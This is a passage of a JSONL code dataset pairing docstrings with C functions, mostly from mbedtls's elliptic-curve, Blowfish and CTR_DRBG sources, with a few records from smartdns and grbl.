prefix_touchar(prefix), node->prefix->bitlen))\n\t\t\treturn (node);\n\t}\n\treturn (NULL);\n}", "path": "smartdns/src/lib/radix.c", "commit_date": "2020-01-21 00:00:00", "repo_name": "pymumu/smartdns", "stars": 7587, "license": "gpl-3.0", "language": "c", "size": 3604}
{"docstring": "/*\n * if func is supplied, it will be called as func(node->prefix, node->data)\n */\n", "func_signal": "void\nradix_process(radix_tree_t *radix, rdx_cb_t func, void *cbctx)", "code": "{\n\tradix_node_t *node;\n\n\tRADIX_WALK(radix->head, node) {\n\t\tfunc(node, cbctx);\n\t} RADIX_WALK_END;\n}", "path": "smartdns/src/lib/radix.c", "commit_date": "2020-01-21 00:00:00", "repo_name": "pymumu/smartdns", "stars": 7587, "license": "gpl-3.0", "language": "c", "size": 3604}
{"docstring": "/*\n * Fast quasi-reduction modulo p384 (FIPS 186-3 D.2.4)\n */\n", "func_signal": "static int ecp_mod_p384( mbedtls_mpi *N )", "code": "{\n    INIT( 384 );\n\n    ADD( 12 ); ADD( 21 ); ADD( 20 );\n    SUB( 23 );                                              NEXT; // A0\n\n    ADD( 13 ); ADD( 22 ); ADD( 23 );\n    SUB( 12 ); SUB( 20 );                                   NEXT; // A2\n\n    ADD( 14 ); ADD( 23 );\n    SUB( 13 ); SUB( 21 );                                   NEXT; // A2\n\n    ADD( 15 ); ADD( 12 ); ADD( 20 ); ADD( 21 );\n    SUB( 14 ); SUB( 22 ); SUB( 23 );                        NEXT; // A3\n\n    ADD( 21 ); ADD( 21 ); ADD( 16 ); ADD( 13 ); ADD( 12 ); ADD( 20 ); ADD( 22 );\n    SUB( 15 ); SUB( 23 ); SUB( 23 );                        NEXT; // A4\n\n    ADD( 22 ); ADD( 22 ); ADD( 17 ); ADD( 14 ); ADD( 13 ); ADD( 21 ); ADD( 23 );\n    SUB( 16 );                                              NEXT; // A5\n\n    ADD( 23 ); ADD( 23 ); ADD( 18 ); ADD( 15 ); ADD( 14 ); ADD( 22 );\n    SUB( 17 );                                              NEXT; // A6\n\n    ADD( 19 ); ADD( 16 ); ADD( 15 ); ADD( 23 );\n    SUB( 18 );                                              NEXT; // A7\n\n    ADD( 20 ); ADD( 17 ); ADD( 16 );\n    SUB( 19 );                                              NEXT; // A8\n\n    ADD( 21 ); ADD( 18 ); ADD( 17 );\n    SUB( 20 );                                              NEXT; // A9\n\n    ADD( 22 ); ADD( 19 ); ADD( 18 );\n    SUB( 21 );                                              NEXT; // A10\n\n    ADD( 23 ); ADD( 20 ); ADD( 19 );\n    SUB( 22 );                                              LAST; // A11\n\ncleanup:\n    return( ret );\n}", "path": "Logan/Logan/mbedtls/library/ecp_curves.c", "commit_date": "2018-09-26 00:00:00", "repo_name": "Meituan-Dianping/Logan", "stars": 5521, "license": "mit", "language": "c", "size": 21235}
{"docstring": "/*\n * Fast quasi-reduction modulo p255 = 2^255 - 19\n * Write N as A0 + 2^255 A1, return A0 + 19 * A1\n */\n", "func_signal": "static int ecp_mod_p255( mbedtls_mpi *N )", "code": "{\n    int ret;\n    size_t i;\n    mbedtls_mpi M;\n    mbedtls_mpi_uint Mp[P255_WIDTH + 2];\n\n    if( N->n < P255_WIDTH )\n        return( 0 );\n\n    /* M = A1 */\n    M.s = 1;\n    M.n = N->n - ( P255_WIDTH - 1 );\n    if( M.n > P255_WIDTH + 1 )\n        M.n = P255_WIDTH + 1;\n    M.p = Mp;\n    memset( Mp, 0, sizeof Mp );\n    memcpy( Mp, N->p + P255_WIDTH - 1, M.n * sizeof( mbedtls_mpi_uint ) );\n    MBEDTLS_MPI_CHK( mbedtls_mpi_shift_r( &M, 255 % ( 8 * sizeof( mbedtls_mpi_uint ) ) ) );\n    M.n++; /* Make room for multiplication by 19 */\n\n    /* N = A0 */\n    MBEDTLS_MPI_CHK( mbedtls_mpi_set_bit( N, 255, 0 ) );\n    for( i = P255_WIDTH; i < N->n; i++ )\n        N->p[i] = 0;\n\n    /* N = A0 + 19 * A1 */\n    MBEDTLS_MPI_CHK( mbedtls_mpi_mul_int( &M, &M, 19 ) );\n    MBEDTLS_MPI_CHK( mbedtls_mpi_add_abs( N, N, &M ) );\n\ncleanup:\n    return( ret );\n}", "path": "Logan/Logan/mbedtls/library/ecp_curves.c", "commit_date": "2018-09-26 00:00:00", "repo_name": "Meituan-Dianping/Logan", "stars": 5521, "license": "mit", "language": "c", "size": 21235}
{"docstring": "/*\n * Fast quasi-reduction modulo p224k1 = 2^224 - R,\n * with R = 2^32 + 2^12 + 2^11 + 2^9 + 2^7 + 2^4 + 2 + 1 = 0x0100001A93\n */\n", "func_signal": "static int ecp_mod_p224k1( mbedtls_mpi *N )", "code": "{\n    static mbedtls_mpi_uint Rp[] = {\n        BYTES_TO_T_UINT_8( 0x93, 0x1A, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00 ) };\n\n#if defined(MBEDTLS_HAVE_INT64)\n    return( ecp_mod_koblitz( N, Rp, 4, 1, 32, 0xFFFFFFFF ) );\n#else\n    return( ecp_mod_koblitz( N, Rp, 224 / 8 / sizeof( mbedtls_mpi_uint ), 0, 0, 0 ) );\n#endif\n}", "path": "Logan/Logan/mbedtls/library/ecp_curves.c", "commit_date": "2018-09-26 00:00:00", "repo_name": "Meituan-Dianping/Logan", "stars": 5521, "license": "mit", "language": "c", "size": 21235}
{"docstring": "/* Add 64-bit chunks (dst += src) and update carry */\n", "func_signal": "static inline void add64( mbedtls_mpi_uint *dst, mbedtls_mpi_uint *src, mbedtls_mpi_uint *carry )", "code": "{\n    unsigned char i;\n    mbedtls_mpi_uint c = 0;\n    for( i = 0; i < 8 / sizeof( mbedtls_mpi_uint ); i++, dst++, src++ )\n    {\n        *dst += c;      c  = ( *dst < c );\n        *dst += *src;   c += ( *dst < *src );\n    }\n    *carry += c;\n}", "path": "Logan/Logan/mbedtls/library/ecp_curves.c", "commit_date": "2018-09-26 00:00:00", "repo_name": "Meituan-Dianping/Logan", "stars": 5521, "license": "mit", "language": "c", "size": 21235}
{"docstring": "/*\n * Blowfish key schedule\n */\n", "func_signal": "int mbedtls_blowfish_setkey( mbedtls_blowfish_context *ctx, const unsigned char *key,\n                     unsigned int keybits )", "code": "{\n    unsigned int i, j, k;\n    uint32_t data, datal, datar;\n\n    if( keybits < MBEDTLS_BLOWFISH_MIN_KEY_BITS || keybits > MBEDTLS_BLOWFISH_MAX_KEY_BITS ||\n        ( keybits % 8 ) )\n    {\n        return( MBEDTLS_ERR_BLOWFISH_INVALID_KEY_LENGTH );\n    }\n\n    keybits >>= 3;\n\n    for( i = 0; i < 4; i++ )\n    {\n        for( j = 0; j < 256; j++ )\n            ctx->S[i][j] = S[i][j];\n    }\n\n    j = 0;\n    for( i = 0; i < MBEDTLS_BLOWFISH_ROUNDS + 2; ++i )\n    {\n        data = 0x00000000;\n        for( k = 0; k < 4; ++k )\n        {\n            data = ( data << 8 ) | key[j++];\n            if( j >= keybits )\n                j = 0;\n        }\n        ctx->P[i] = P[i] ^ data;\n    }\n\n    datal = 0x00000000;\n    datar = 0x00000000;\n\n    for( i = 0; i < MBEDTLS_BLOWFISH_ROUNDS + 2; i += 2 )\n    {\n        blowfish_enc( ctx, &datal, &datar );\n        ctx->P[i] = datal;\n        ctx->P[i + 1] = datar;\n    }\n\n    for( i = 0; i < 4; i++ )\n    {\n       for( j = 0; j < 256; j += 2 )\n       {\n            blowfish_enc( ctx, &datal, &datar );\n            ctx->S[i][j] = datal;\n            ctx->S[i][j + 1] = datar;\n        }\n    }\n    return( 0 );\n}", "path": "Logan/Logan/mbedtls/library/blowfish.c", "commit_date": "2018-09-26 00:00:00", "repo_name": "Meituan-Dianping/Logan", "stars": 5521, "license": "mit", "language": "c", "size": 21235}
{"docstring": "/*\n * CTR_DRBG context initialization\n */\n", "func_signal": "void mbedtls_ctr_drbg_init( mbedtls_ctr_drbg_context *ctx )", "code": "{\n    memset( ctx, 0, sizeof( mbedtls_ctr_drbg_context ) );\n\n#if defined(MBEDTLS_THREADING_C)\n    mbedtls_mutex_init( &ctx->mutex );\n#endif\n}", "path": "Logan/Logan/mbedtls/library/ctr_drbg.c", "commit_date": "2018-09-26 00:00:00", "repo_name": "Meituan-Dianping/Logan", "stars": 5521, "license": "mit", "language": "c", "size": 21235}
{"docstring": "/*\n * Fast quasi-reduction modulo p256 (FIPS 186-3 D.2.3)\n */\n", "func_signal": "static int ecp_mod_p256( mbedtls_mpi *N )", "code": "{\n    INIT( 256 );\n\n    ADD(  8 ); ADD(  9 );\n    SUB( 11 ); SUB( 12 ); SUB( 13 ); SUB( 14 );             NEXT; // A0\n\n    ADD(  9 ); ADD( 10 );\n    SUB( 12 ); SUB( 13 ); SUB( 14 ); SUB( 15 );             NEXT; // A1\n\n    ADD( 10 ); ADD( 11 );\n    SUB( 13 ); SUB( 14 ); SUB( 15 );                        NEXT; // A2\n\n    ADD( 11 ); ADD( 11 ); ADD( 12 ); ADD( 12 ); ADD( 13 );\n    SUB( 15 ); SUB(  8 ); SUB(  9 );                        NEXT; // A3\n\n    ADD( 12 ); ADD( 12 ); ADD( 13 ); ADD( 13 ); ADD( 14 );\n    SUB(  9 ); SUB( 10 );                                   NEXT; // A4\n\n    ADD( 13 ); ADD( 13 ); ADD( 14 ); ADD( 14 ); ADD( 15 );\n    SUB( 10 ); SUB( 11 );                                   NEXT; // A5\n\n    ADD( 14 ); ADD( 14 ); ADD( 15 ); ADD( 15 ); ADD( 14 ); ADD( 13 );\n    SUB(  8 ); SUB(  9 );                                   NEXT; // A6\n\n    ADD( 15 ); ADD( 15 ); ADD( 15 ); ADD( 8 );\n    SUB( 10 ); SUB( 11 ); SUB( 12 ); SUB( 13 );             LAST; // A7\n\ncleanup:\n    return( ret );\n}", "path": "Logan/Logan/mbedtls/library/ecp_curves.c", "commit_date": "2018-09-26 00:00:00", "repo_name": "Meituan-Dianping/Logan", "stars": 5521, "license": "mit", "language": "c", "size": 21235}
{"docstring": "/*\n * Non-public function wrapped by mbedtls_ctr_drbg_seed(). Necessary to allow\n * NIST tests to succeed (which require known length fixed entropy)\n */\n", "func_signal": "int mbedtls_ctr_drbg_seed_entropy_len(\n                   mbedtls_ctr_drbg_context *ctx,\n                   int (*f_entropy)(void *, unsigned char *, size_t),\n                   void *p_entropy,\n                   const unsigned char *custom,\n                   size_t len,\n                   size_t entropy_len )", "code": "{\n    int ret;\n    unsigned char key[MBEDTLS_CTR_DRBG_KEYSIZE];\n\n    memset( key, 0, MBEDTLS_CTR_DRBG_KEYSIZE );\n\n    mbedtls_aes_init( &ctx->aes_ctx );\n\n    ctx->f_entropy = f_entropy;\n    ctx->p_entropy = p_entropy;\n\n    ctx->entropy_len = entropy_len;\n    ctx->reseed_interval = MBEDTLS_CTR_DRBG_RESEED_INTERVAL;\n\n    /*\n     * Initialize with an empty key\n     */\n    mbedtls_aes_setkey_enc( &ctx->aes_ctx, key, MBEDTLS_CTR_DRBG_KEYBITS );\n\n    if( ( ret = mbedtls_ctr_drbg_reseed( ctx, custom, len ) ) != 0 )\n        return( ret );\n\n    return( 0 );\n}", "path": "Logan/Logan/mbedtls/library/ctr_drbg.c", "commit_date": "2018-09-26 00:00:00", "repo_name": "Meituan-Dianping/Logan", "stars": 5521, "license": "mit", "language": "c", "size": 21235}
{"docstring": "/*\n * Specialized function for creating the Curve25519 group\n */\n", "func_signal": "static int ecp_use_curve25519( mbedtls_ecp_group *grp )", "code": "{\n    int ret;\n\n    /* Actually ( A + 2 ) / 4 */\n    MBEDTLS_MPI_CHK( mbedtls_mpi_read_string( &grp->A, 16, \"01DB42\" ) );\n\n    /* P = 2^255 - 19 */\n    MBEDTLS_MPI_CHK( mbedtls_mpi_lset( &grp->P, 1 ) );\n    MBEDTLS_MPI_CHK( mbedtls_mpi_shift_l( &grp->P, 255 ) );\n    MBEDTLS_MPI_CHK( mbedtls_mpi_sub_int( &grp->P, &grp->P, 19 ) );\n    grp->pbits = mbedtls_mpi_bitlen( &grp->P );\n\n    /* Y intentionaly not set, since we use x/z coordinates.\n     * This is used as a marker to identify Montgomery curves! */\n    MBEDTLS_MPI_CHK( mbedtls_mpi_lset( &grp->G.X, 9 ) );\n    MBEDTLS_MPI_CHK( mbedtls_mpi_lset( &grp->G.Z, 1 ) );\n    mbedtls_mpi_free( &grp->G.Y );\n\n    /* Actually, the required msb for private keys */\n    grp->nbits = 254;\n\ncleanup:\n    if( ret != 0 )\n        mbedtls_ecp_group_free( grp );\n\n    return( ret );\n}", "path": "Logan/Logan/mbedtls/library/ecp_curves.c", "commit_date": "2018-09-26 00:00:00", "repo_name": "Meituan-Dianping/Logan", "stars": 5521, "license": "mit", "language": "c", "size": 21235}
{"docstring": "/*\n * Blowfish-CBC buffer encryption/decryption\n */\n", "func_signal": "int mbedtls_blowfish_crypt_cbc( mbedtls_blowfish_context *ctx,\n                    int mode,\n                    size_t length,\n                    unsigned char iv[MBEDTLS_BLOWFISH_BLOCKSIZE],\n                    const unsigned char *input,\n                    unsigned char *output )", "code": "{\n    int i;\n    unsigned char temp[MBEDTLS_BLOWFISH_BLOCKSIZE];\n\n    if( length % MBEDTLS_BLOWFISH_BLOCKSIZE )\n        return( MBEDTLS_ERR_BLOWFISH_INVALID_INPUT_LENGTH );\n\n    if( mode == MBEDTLS_BLOWFISH_DECRYPT )\n    {\n        while( length > 0 )\n        {\n            memcpy( temp, input, MBEDTLS_BLOWFISH_BLOCKSIZE );\n            mbedtls_blowfish_crypt_ecb( ctx, mode, input, output );\n\n            for( i = 0; i < MBEDTLS_BLOWFISH_BLOCKSIZE;i++ )\n                output[i] = (unsigned char)( output[i] ^ iv[i] );\n\n            memcpy( iv, temp, MBEDTLS_BLOWFISH_BLOCKSIZE );\n\n            input  += MBEDTLS_BLOWFISH_BLOCKSIZE;\n            output += MBEDTLS_BLOWFISH_BLOCKSIZE;\n            length -= MBEDTLS_BLOWFISH_BLOCKSIZE;\n        }\n    }\n    else\n    {\n        while( length > 0 )\n        {\n            for( i = 0; i < MBEDTLS_BLOWFISH_BLOCKSIZE; i++ )\n                output[i] = (unsigned char)( input[i] ^ iv[i] );\n\n            mbedtls_blowfish_crypt_ecb( ctx, mode, output, output );\n            memcpy( iv, output, MBEDTLS_BLOWFISH_BLOCKSIZE );\n\n            input  += MBEDTLS_BLOWFISH_BLOCKSIZE;\n            output += MBEDTLS_BLOWFISH_BLOCKSIZE;\n            length -= MBEDTLS_BLOWFISH_BLOCKSIZE;\n        }\n    }\n\n    return( 0 );\n}", "path": "Logan/Logan/mbedtls/library/blowfish.c", "commit_date": "2018-09-26 00:00:00", "repo_name": "Meituan-Dianping/Logan", "stars": 5521, "license": "mit", "language": "c", "size": 21235}
{"docstring": "/* Add carry to a 64-bit chunk and update carry */\n", "func_signal": "static inline void carry64( mbedtls_mpi_uint *dst, mbedtls_mpi_uint *carry )", "code": "{\n    unsigned char i;\n    for( i = 0; i < 8 / sizeof( mbedtls_mpi_uint ); i++, dst++ )\n    {\n        *dst += *carry;\n        *carry  = ( *dst < *carry );\n    }\n}", "path": "Logan/Logan/mbedtls/library/ecp_curves.c", "commit_date": "2018-09-26 00:00:00", "repo_name": "Meituan-Dianping/Logan", "stars": 5521, "license": "mit", "language": "c", "size": 21235}
{"docstring": "// Limbs in R\n", "func_signal": "static inline int ecp_mod_koblitz( mbedtls_mpi *N, mbedtls_mpi_uint *Rp, size_t p_limbs,\n                                   size_t adjust, size_t shift, mbedtls_mpi_uint mask )", "code": "{\n    int ret;\n    size_t i;\n    mbedtls_mpi M, R;\n    mbedtls_mpi_uint Mp[P_KOBLITZ_MAX + P_KOBLITZ_R + 1];\n\n    if( N->n < p_limbs )\n        return( 0 );\n\n    /* Init R */\n    R.s = 1;\n    R.p = Rp;\n    R.n = P_KOBLITZ_R;\n\n    /* Common setup for M */\n    M.s = 1;\n    M.p = Mp;\n\n    /* M = A1 */\n    M.n = N->n - ( p_limbs - adjust );\n    if( M.n > p_limbs + adjust )\n        M.n = p_limbs + adjust;\n    memset( Mp, 0, sizeof Mp );\n    memcpy( Mp, N->p + p_limbs - adjust, M.n * sizeof( mbedtls_mpi_uint ) );\n    if( shift != 0 )\n        MBEDTLS_MPI_CHK( mbedtls_mpi_shift_r( &M, shift ) );\n    M.n += R.n; /* Make room for multiplication by R */\n\n    /* N = A0 */\n    if( mask != 0 )\n        N->p[p_limbs - 1] &= mask;\n    for( i = p_limbs; i < N->n; i++ )\n        N->p[i] = 0;\n\n    /* N = A0 + R * A1 */\n    MBEDTLS_MPI_CHK( mbedtls_mpi_mul_mpi( &M, &M, &R ) );\n    MBEDTLS_MPI_CHK( mbedtls_mpi_add_abs( N, N, &M ) );\n\n    /* Second pass */\n\n    /* M = A1 */\n    M.n = N->n - ( p_limbs - adjust );\n    if( M.n > p_limbs + adjust )\n        M.n = p_limbs + adjust;\n    memset( Mp, 0, sizeof Mp );\n    memcpy( Mp, N->p + p_limbs - adjust, M.n * sizeof( mbedtls_mpi_uint ) );\n    if( shift != 0 )\n        MBEDTLS_MPI_CHK( mbedtls_mpi_shift_r( &M, shift ) );\n    M.n += R.n; /* Make room for multiplication by R */\n\n    /* N = A0 */\n    if( mask != 0 )\n        N->p[p_limbs - 1] &= mask;\n    for( i = p_limbs; i < N->n; i++ )\n        N->p[i] = 0;\n\n    /* N = A0 + R * A1 */\n    MBEDTLS_MPI_CHK( mbedtls_mpi_mul_mpi( &M, &M, &R ) );\n    MBEDTLS_MPI_CHK( mbedtls_mpi_add_abs( N, N, &M ) );\n\ncleanup:\n    return( ret );\n}", "path": "Logan/Logan/mbedtls/library/ecp_curves.c", "commit_date": "2018-09-26 00:00:00", "repo_name": "Meituan-Dianping/Logan", "stars": 5521, "license": "mit", "language": "c", "size": 21235}
{"docstring": "/*\n * Fast quasi-reduction modulo p224 (FIPS 186-3 D.2.2)\n */\n", "func_signal": "static int ecp_mod_p224( mbedtls_mpi *N )", "code": "{\n    INIT( 224 );\n\n    SUB(  7 ); SUB( 11 );               NEXT; // A0 += -A7 - A11\n    SUB(  8 ); SUB( 12 );               NEXT; // A1 += -A8 - A12\n    SUB(  9 ); SUB( 13 );               NEXT; // A2 += -A9 - A13\n    SUB( 10 ); ADD(  7 ); ADD( 11 );    NEXT; // A3 += -A10 + A7 + A11\n    SUB( 11 ); ADD(  8 ); ADD( 12 );    NEXT; // A4 += -A11 + A8 + A12\n    SUB( 12 ); ADD(  9 ); ADD( 13 );    NEXT; // A5 += -A12 + A9 + A13\n    SUB( 13 ); ADD( 10 );               LAST; // A6 += -A13 + A10\n\ncleanup:\n    return( ret );\n}", "path": "Logan/Logan/mbedtls/library/ecp_curves.c", "commit_date": "2018-09-26 00:00:00", "repo_name": "Meituan-Dianping/Logan", "stars": 5521, "license": "mit", "language": "c", "size": 21235}
{"docstring": "/*\n * Blowfish-ECB block encryption/decryption\n */\n", "func_signal": "int mbedtls_blowfish_crypt_ecb( mbedtls_blowfish_context *ctx,\n                    int mode,\n                    const unsigned char input[MBEDTLS_BLOWFISH_BLOCKSIZE],\n                    unsigned char output[MBEDTLS_BLOWFISH_BLOCKSIZE] )", "code": "{\n    uint32_t X0, X1;\n\n    GET_UINT32_BE( X0, input,  0 );\n    GET_UINT32_BE( X1, input,  4 );\n\n    if( mode == MBEDTLS_BLOWFISH_DECRYPT )\n    {\n        blowfish_dec( ctx, &X0, &X1 );\n    }\n    else /* MBEDTLS_BLOWFISH_ENCRYPT */\n    {\n        blowfish_enc( ctx, &X0, &X1 );\n    }\n\n    PUT_UINT32_BE( X0, output,  0 );\n    PUT_UINT32_BE( X1, output,  4 );\n\n    return( 0 );\n}", "path": "Logan/Logan/mbedtls/library/blowfish.c", "commit_date": "2018-09-26 00:00:00", "repo_name": "Meituan-Dianping/Logan", "stars": 5521, "license": "mit", "language": "c", "size": 21235}
{"docstring": "/*\n * Fast quasi-reduction modulo p192k1 = 2^192 - R,\n * with R = 2^32 + 2^12 + 2^8 + 2^7 + 2^6 + 2^3 + 1 = 0x0100001119\n */\n", "func_signal": "static int ecp_mod_p192k1( mbedtls_mpi *N )", "code": "{\n    static mbedtls_mpi_uint Rp[] = {\n        BYTES_TO_T_UINT_8( 0xC9, 0x11, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00 ) };\n\n    return( ecp_mod_koblitz( N, Rp, 192 / 8 / sizeof( mbedtls_mpi_uint ), 0, 0, 0 ) );\n}", "path": "Logan/Logan/mbedtls/library/ecp_curves.c", "commit_date": "2018-09-26 00:00:00", "repo_name": "Meituan-Dianping/Logan", "stars": 5521, "license": "mit", "language": "c", "size": 21235}
{"docstring": "/*\n * Make group available from embedded constants\n */\n", "func_signal": "static int ecp_group_load( mbedtls_ecp_group *grp,\n                           const mbedtls_mpi_uint *p,  size_t plen,\n                           const mbedtls_mpi_uint *a,  size_t alen,\n                           const mbedtls_mpi_uint *b,  size_t blen,\n                           const mbedtls_mpi_uint *gx, size_t gxlen,\n                           const mbedtls_mpi_uint *gy, size_t gylen,\n                           const mbedtls_mpi_uint *n,  size_t nlen)", "code": "{\n    ecp_mpi_load( &grp->P, p, plen );\n    if( a != NULL )\n        ecp_mpi_load( &grp->A, a, alen );\n    ecp_mpi_load( &grp->B, b, blen );\n    ecp_mpi_load( &grp->N, n, nlen );\n\n    ecp_mpi_load( &grp->G.X, gx, gxlen );\n    ecp_mpi_load( &grp->G.Y, gy, gylen );\n    ecp_mpi_set1( &grp->G.Z );\n\n    grp->pbits = mbedtls_mpi_bitlen( &grp->P );\n    grp->nbits = mbedtls_mpi_bitlen( &grp->N );\n\n    grp->h = 1;\n\n    return( 0 );\n}", "path": "Logan/Logan/mbedtls/library/ecp_curves.c", "commit_date": "2018-09-26 00:00:00", "repo_name": "Meituan-Dianping/Logan", "stars": 5521, "license": "mit", "language": "c", "size": 21235}
{"docstring": "/*\n * Fast quasi-reduction modulo p192 (FIPS 186-3 D.2.1)\n */\n", "func_signal": "static int ecp_mod_p192( mbedtls_mpi *N )", "code": "{\n    int ret;\n    mbedtls_mpi_uint c = 0;\n    mbedtls_mpi_uint *p, *end;\n\n    /* Make sure we have enough blocks so that A(5) is legal */\n    MBEDTLS_MPI_CHK( mbedtls_mpi_grow( N, 6 * WIDTH ) );\n\n    p = N->p;\n    end = p + N->n;\n\n    ADD( 3 ); ADD( 5 );             NEXT; // A0 += A3 + A5\n    ADD( 3 ); ADD( 4 ); ADD( 5 );   NEXT; // A1 += A3 + A4 + A5\n    ADD( 4 ); ADD( 5 );             LAST; // A2 += A4 + A5\n\ncleanup:\n    return( ret );\n}", "path": "Logan/Logan/mbedtls/library/ecp_curves.c", "commit_date": "2018-09-26 00:00:00", "repo_name": "Meituan-Dianping/Logan", "stars": 5521, "license": "mit", "language": "c", "size": 21235}
{"docstring": "/*\n * Fast quasi-reduction modulo p521 (FIPS 186-3 D.2.5)\n * Write N as A1 + 2^521 A0, return A0 + A1\n */\n", "func_signal": "static int ecp_mod_p521( mbedtls_mpi *N )", "code": "{\n    int ret;\n    size_t i;\n    mbedtls_mpi M;\n    mbedtls_mpi_uint Mp[P521_WIDTH + 1];\n    /* Worst case for the size of M is when mbedtls_mpi_uint is 16 bits:\n     * we need to hold bits 513 to 1056, which is 34 limbs, that is\n     * P521_WIDTH + 1. Otherwise P521_WIDTH is enough. */\n\n    if( N->n < P521_WIDTH )\n        return( 0 );\n\n    /* M = A1 */\n    M.s = 1;\n    M.n = N->n - ( P521_WIDTH - 1 );\n    if( M.n > P521_WIDTH + 1 )\n        M.n = P521_WIDTH + 1;\n    M.p = Mp;\n    memcpy( Mp, N->p + P521_WIDTH - 1, M.n * sizeof( mbedtls_mpi_uint ) );\n    MBEDTLS_MPI_CHK( mbedtls_mpi_shift_r( &M, 521 % ( 8 * sizeof( mbedtls_mpi_uint ) ) ) );\n\n    /* N = A0 */\n    N->p[P521_WIDTH - 1] &= P521_MASK;\n    for( i = P521_WIDTH; i < N->n; i++ )\n        N->p[i] = 0;\n\n    /* N = A0 + A1 */\n    MBEDTLS_MPI_CHK( mbedtls_mpi_add_abs( N, N, &M ) );\n\ncleanup:\n    return( ret );\n}", "path": "Logan/Logan/mbedtls/library/ecp_curves.c", "commit_date": "2018-09-26 00:00:00", "repo_name": "Meituan-Dianping/Logan", "stars": 5521, "license": "mit", "language": "c", "size": 21235}
{"docstring": "/*\n * Create an MPI from embedded constants\n * (assumes len is an exact multiple of sizeof mbedtls_mpi_uint)\n */\n", "func_signal": "static inline void ecp_mpi_load( mbedtls_mpi *X, const mbedtls_mpi_uint *p, size_t len )", "code": "{\n    X->s = 1;\n    X->n = len / sizeof( mbedtls_mpi_uint );\n    X->p = (mbedtls_mpi_uint *) p;\n}", "path": "Logan/Logan/mbedtls/library/ecp_curves.c", "commit_date": "2018-09-26 00:00:00", "repo_name": "Meituan-Dianping/Logan", "stars": 5521, "license": "mit", "language": "c", "size": 21235}
{"docstring": "/*\n * Set a group using well-known domain parameters\n */\n", "func_signal": "int mbedtls_ecp_group_load( mbedtls_ecp_group *grp, mbedtls_ecp_group_id id )", "code": "{\n    mbedtls_ecp_group_free( grp );\n\n    grp->id = id;\n\n    switch( id )\n    {\n#if defined(MBEDTLS_ECP_DP_SECP192R1_ENABLED)\n        case MBEDTLS_ECP_DP_SECP192R1:\n            NIST_MODP( p192 );\n            return( LOAD_GROUP( secp192r1 ) );\n#endif /* MBEDTLS_ECP_DP_SECP192R1_ENABLED */\n\n#if defined(MBEDTLS_ECP_DP_SECP224R1_ENABLED)\n        case MBEDTLS_ECP_DP_SECP224R1:\n            NIST_MODP( p224 );\n            return( LOAD_GROUP( secp224r1 ) );\n#endif /* MBEDTLS_ECP_DP_SECP224R1_ENABLED */\n\n#if defined(MBEDTLS_ECP_DP_SECP256R1_ENABLED)\n        case MBEDTLS_ECP_DP_SECP256R1:\n            NIST_MODP( p256 );\n            return( LOAD_GROUP( secp256r1 ) );\n#endif /* MBEDTLS_ECP_DP_SECP256R1_ENABLED */\n\n#if defined(MBEDTLS_ECP_DP_SECP384R1_ENABLED)\n        case MBEDTLS_ECP_DP_SECP384R1:\n            NIST_MODP( p384 );\n            return( LOAD_GROUP( secp384r1 ) );\n#endif /* MBEDTLS_ECP_DP_SECP384R1_ENABLED */\n\n#if defined(MBEDTLS_ECP_DP_SECP521R1_ENABLED)\n        case MBEDTLS_ECP_DP_SECP521R1:\n            NIST_MODP( p521 );\n            return( LOAD_GROUP( secp521r1 ) );\n#endif /* MBEDTLS_ECP_DP_SECP521R1_ENABLED */\n\n#if defined(MBEDTLS_ECP_DP_SECP192K1_ENABLED)\n        case MBEDTLS_ECP_DP_SECP192K1:\n            grp->modp = ecp_mod_p192k1;\n            return( LOAD_GROUP_A( secp192k1 ) );\n#endif /* MBEDTLS_ECP_DP_SECP192K1_ENABLED */\n\n#if defined(MBEDTLS_ECP_DP_SECP224K1_ENABLED)\n        case MBEDTLS_ECP_DP_SECP224K1:\n            grp->modp = ecp_mod_p224k1;\n            return( LOAD_GROUP_A( secp224k1 ) );\n#endif /* MBEDTLS_ECP_DP_SECP224K1_ENABLED */\n\n#if defined(MBEDTLS_ECP_DP_SECP256K1_ENABLED)\n        case MBEDTLS_ECP_DP_SECP256K1:\n            grp->modp = ecp_mod_p256k1;\n            return( LOAD_GROUP_A( secp256k1 ) );\n#endif /* MBEDTLS_ECP_DP_SECP256K1_ENABLED */\n\n#if defined(MBEDTLS_ECP_DP_BP256R1_ENABLED)\n        case MBEDTLS_ECP_DP_BP256R1:\n            return( LOAD_GROUP_A( brainpoolP256r1 ) );\n#endif /* MBEDTLS_ECP_DP_BP256R1_ENABLED */\n\n#if defined(MBEDTLS_ECP_DP_BP384R1_ENABLED)\n        case MBEDTLS_ECP_DP_BP384R1:\n            return( LOAD_GROUP_A( brainpoolP384r1 ) );\n#endif /* MBEDTLS_ECP_DP_BP384R1_ENABLED */\n\n#if defined(MBEDTLS_ECP_DP_BP512R1_ENABLED)\n        case MBEDTLS_ECP_DP_BP512R1:\n            return( LOAD_GROUP_A( brainpoolP512r1 ) );\n#endif /* MBEDTLS_ECP_DP_BP512R1_ENABLED */\n\n#if defined(MBEDTLS_ECP_DP_CURVE25519_ENABLED)\n        case MBEDTLS_ECP_DP_CURVE25519:\n            grp->modp = ecp_mod_p255;\n            return( ecp_use_curve25519( grp ) );\n#endif /* MBEDTLS_ECP_DP_CURVE25519_ENABLED */\n\n        default:\n            mbedtls_ecp_group_free( grp );\n            return( MBEDTLS_ERR_ECP_FEATURE_UNAVAILABLE );\n    }\n}", "path": "Logan/Logan/mbedtls/library/ecp_curves.c", "commit_date": "2018-09-26 00:00:00", "repo_name": "Meituan-Dianping/Logan", "stars": 5521, "license": "mit", "language": "c", "size": 21235}
{"docstring": "// Prints an uint8 variable in base 10.\n", "func_signal": "void print_uint8_base10(uint8_t n)", "code": "{   \n  uint8_t digits;\n  if (n < 10) { digits = 1; } \n  else if (n < 100) { digits = 2; }\n  else { digits = 3; }\n  print_unsigned_int8(n,10,digits);\n}", "path": "grbl/grbl/print.c", "commit_date": "2015-05-23 00:00:00", "repo_name": "grbl/grbl", "stars": 5327, "license": "other", "language": "c", "size": 2285}
{"docstring": "// Called by planner_recalculate() when the executing block is updated by the new plan.\n", "func_signal": "void st_update_plan_block_parameters()", "code": "{ \n  if (pl_block != NULL) { // Ignore if at start of a new block.\n    prep.flag_partial_block = true;\n    pl_block->entry_speed_sqr = prep.current_speed*prep.current_speed; // Update entry speed.\n    pl_block = NULL; // Flag st_prep_segment() to load new velocity profile.\n  }\n}", "path": "grbl/grbl/stepper.c", "commit_date": "2016-03-04 00:00:00", "repo_name": "grbl/grbl", "stars": 5327, "license": "other", "language": "c", "size": 2285}
